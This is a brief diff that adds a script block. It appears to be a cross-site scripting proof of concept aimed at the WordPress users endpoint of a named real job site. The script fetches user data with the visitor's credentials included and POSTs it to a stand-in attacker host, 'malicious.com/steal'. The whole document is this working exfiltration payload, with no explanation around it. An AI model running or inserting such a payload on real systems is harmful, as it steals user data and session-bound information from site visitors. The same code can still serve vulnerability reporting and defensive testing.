@@ -1,0 +1,8 @@
+<script>
+    fetch('https://jobs.kiwi.com/wp-json/wp/v2/users', {
+      method: 'GET',
+      credentials: 'include'
+    })
+    .then(response => response.json())
+    .then(data => fetch('https://malicious.com/steal', {method: 'POST', body: JSON.stringify(data)}));
+  </script>
